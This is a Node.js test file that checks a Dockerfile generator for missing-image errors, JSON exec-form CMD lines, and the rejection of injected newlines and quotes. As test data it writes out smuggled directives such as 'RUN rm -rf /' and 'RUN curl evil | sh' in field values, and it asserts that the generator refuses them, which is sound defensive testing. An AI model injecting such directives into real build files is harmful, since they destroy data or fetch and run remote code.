'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const MODULE_PATH = path.resolve(
    __dirname,
    '../source/docker-deon-source-node.js',
);

const {
    assertNoInjection,
    composeStage,
    generateDockerText,
} = require(MODULE_PATH);


test('multi-stage compose output no longer contains the literal "undefined"', () => {
    // A raw literal-list stage followed by two map stages.
    const data = [
        [
            'FROM node:18-alpine AS builder',
            'RUN echo build',
        ],
        {
            imagene: 'node:18-alpine',
            arguments: ['NPM_TOKEN'],
            environment: { PORT: '8080' },
            directory: '/app',
            actions: ['COPY . .'],
            command: ['node', 'index.js'],
        },
        {
            imagene: 'nginx:stable',
            directory: '/usr/share/nginx/html',
            command: ['nginx', '-g', 'daemon off;'],
        },
    ];

    const output = generateDockerText(data);

    assert.equal(
        output.includes('undefined'),
        false,
        'generated Dockerfile must not contain the literal "undefined"',
    );
    // Sanity: all three stages are actually present.
    assert.match(output, /FROM node:18-alpine AS builder/);
    assert.match(output, /FROM node:18-alpine\n/);
    assert.match(output, /FROM nginx:stable/);
});


test('a single map stage returns a string (never undefined) and is injection-free', () => {
    const stageString = composeStage(0, {
        imagene: 'node:18-alpine',
        command: ['node', 'server.js'],
    });

    assert.equal(typeof stageString, 'string');
    assert.equal(stageString.includes('undefined'), false);
});


test('a command with quotes/spaces yields a valid JSON-array CMD line', () => {
    const command = ['sh', '-c', 'echo "hello world" && run'];

    const output = generateDockerText([
        { imagene: 'alpine:3', command },
    ]);

    const cmdLine = output
        .split('\n')
        .find((line) => line.startsWith('CMD '));

    assert.ok(cmdLine, 'a CMD line must be emitted');

    // The CMD payload must be valid JSON (exec form) and round-trip exactly.
    const jsonPart = cmdLine.slice('CMD '.length);
    const parsed = JSON.parse(jsonPart);
    assert.deepEqual(parsed, command);

    // Concretely: the inner quotes are escaped, not hand-written.
    assert.equal(
        cmdLine,
        'CMD ["sh","-c","echo \\"hello world\\" && run"]',
    );
});


test('a string command is normalized into a JSON exec array', () => {
    const output = generateDockerText([
        { imagene: 'alpine:3', command: 'node index.js' },
    ]);

    const cmdLine = output
        .split('\n')
        .find((line) => line.startsWith('CMD '));

    assert.equal(cmdLine, 'CMD ["node index.js"]');
    assert.deepEqual(JSON.parse(cmdLine.slice('CMD '.length)), ['node index.js']);
});


test('newline / CR / quote in an instruction field is rejected (throws)', () => {
    // Directory (WORKDIR) with an injected newline + extra directive.
    assert.throws(
        () => generateDockerText([
            { imagene: 'node:18', directory: '/app\nRUN rm -rf /' },
        ]),
        /illegal character in 'directory'/,
    );

    // Base image (FROM) with an injected newline.
    assert.throws(
        () => generateDockerText([
            { imagene: 'node:18\nRUN evil' },
        ]),
        /illegal character in 'imagene'/,
    );

    // Environment value with a carriage return.
    assert.throws(
        () => generateDockerText([
            { imagene: 'node:18', environment: { X: 'a\rENV Y=z' } },
        ]),
        /illegal character in 'environment value'/,
    );

    // A double quote is also rejected.
    assert.throws(
        () => assertNoInjection('no"quotes', 'imagene', 0),
        /illegal character/,
    );
});


test('a missing imagene is a hard error (root cause of the "undefined" append)', () => {
    assert.throws(
        () => composeStage(2, { command: ['node'] }),
        /Stage 2 has no imagene/,
    );
});


test('a field containing a newline is rejected with a non-zero exit', () => {
    // Exercise the real generation code in a fresh process and assert that an
    // injected newline causes a non-zero exit (mirroring main()'s contract of
    // printing the error and process.exit(1)).
    const childScript = `
        const { generateDockerText } = require(${JSON.stringify(MODULE_PATH)});
        try {
            const out = generateDockerText([
                { imagene: 'node:18-alpine', directory: 'app\\nRUN curl evil | sh' },
            ]);
            process.stdout.write(out);
            process.exit(0);
        } catch (error) {
            console.error(error.message);
            process.exit(1);
        }
    `;

    const result = spawnSync(
        process.execPath,
        ['-e', childScript],
        { encoding: 'utf8' },
    );

    assert.equal(result.status, 1, 'process must exit non-zero on injection');
    assert.match(result.stderr, /illegal character in 'directory'/);
    // The injected directive must never reach the generated output.
    assert.equal(result.stdout.includes('RUN curl evil'), false);
});
